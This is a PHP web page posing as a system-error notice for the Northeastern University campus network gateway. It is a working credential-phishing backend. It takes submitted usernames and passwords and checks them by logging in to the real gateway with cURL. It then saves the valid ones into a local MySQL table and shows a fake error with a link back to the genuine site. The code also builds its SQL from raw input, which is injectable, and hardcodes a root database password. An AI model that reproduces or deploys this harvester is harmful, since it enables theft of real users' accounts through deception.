<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>错误信息提示1</title>
</head>

<body>
<?php
//设置post的数据
$post = array (
'action'=>'login',
'ac_id'=>3,
'username'=> $_POST["username"],
'password'=> $_POST["password"],
'save_me'=>0
);
//模拟登录
function login_post($url, $cookie, $post) {
	$curl = curl_init();//初始化curl模块
	curl_setopt($curl, CURLOPT_URL, $url);//登录提交的地址
	curl_setopt($curl, CURLOPT_HEADER, 0);//是否显示头信息
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);//是否自动显示返回的信息
	curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie); //设置Cookie信息保存在指定的文件中
	curl_setopt($curl, CURLOPT_POST, 1);//post方式提交
	curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post));//要提交的信息
	$data = curl_exec($curl);//执行cURL
	file_put_contents('save.txt',$data);
	curl_close($curl);//关闭cURL资源，并且释放系统资源
}
//登录地址
$url = "http://ipgw.neu.edu.cn/srun_portal_pc.php?ac_id=3&url=http://www.msftconnecttest.com/redirect";
//设置cookie保存路径
$cookie = dirname(__FILE__) . '/cookie_oschina.txt';
//模拟登录
login_post($url, $cookie, $post);
$text = file_get_contents('save.txt');
preg_match("/value=\"(.*)\"/",$text,$m);
if($m[1] == "auto_logout")
{
	echo "密码正确";
	$servername = "localhost";
	$username = "root";
	$password = "123456";
	$dbname = "cstudy";
	$User = $_POST["username"];
	$Pwd = $_POST["password"];
	$conn = new mysqli($servername, $username, $password, $dbname);
	$sql = "insert into login values($User,$Pwd)";
	$conn->query($sql);
	$conn->close();
}

if($m[1] == "login")
{
	echo "密码错误";
}

?>
<P>系统错误，点击<a href="http://ipgw.neu.edu.cn">这里</a>返回</P>
</body>
</html>